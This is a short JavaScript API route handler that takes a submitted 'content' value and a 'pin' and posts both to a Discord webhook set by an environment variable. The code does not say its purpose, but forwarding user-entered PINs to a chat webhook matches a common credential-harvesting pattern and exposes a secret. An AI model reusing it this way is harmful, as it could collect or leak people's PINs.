export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { content, pin } = req.body;
  if (!content || !pin) {
    return res.status(400).json({ error: "Missing data" });
  }

  try {
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `File: ${content}\nPIN: ${pin}`,
      }),
    });

    if (!response.ok) throw new Error("Discord error");

    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: "Failed to send to Discord" });
  }
}
